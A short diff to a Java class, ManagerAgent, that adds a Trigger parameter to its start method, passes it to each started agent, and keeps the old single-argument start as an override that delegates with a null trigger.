@@ -10,6 +10,7 @@ package com.android.service.manager;
 import java.util.HashMap;
 import java.util.Iterator;
 
+import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfModule;
 import com.android.service.conf.ConfigurationException;
@@ -124,8 +125,7 @@ public class ManagerAgent extends Manager<BaseModule, String, String> {
 	 * @param key
 	 *            the key
 	 */
-	@Override
-	public synchronized void start(final String key) {
+	public synchronized void start(final String key, Trigger trigger) {
 		HashMap<String, ConfModule> agents;
 
 		agents = status.getAgentsMap();
@@ -168,6 +168,7 @@ public class ManagerAgent extends Manager<BaseModule, String, String> {
 		}
 		
 		if(	a.setConf(agents.get(key)) ){
+			a.setTrigger(trigger);
 			final Thread t = new Thread(a);
 			if (Cfg.DEBUG) {
 				t.setName(a.getClass().getSimpleName());
@@ -243,6 +244,12 @@ public class ManagerAgent extends Manager<BaseModule, String, String> {
 		}
 
 		Utils.sleep(2000);
+	}
+
+	@Override
+	public void start(String moduleId) {
+		start(moduleId, null);
+		
 	}
 
 }
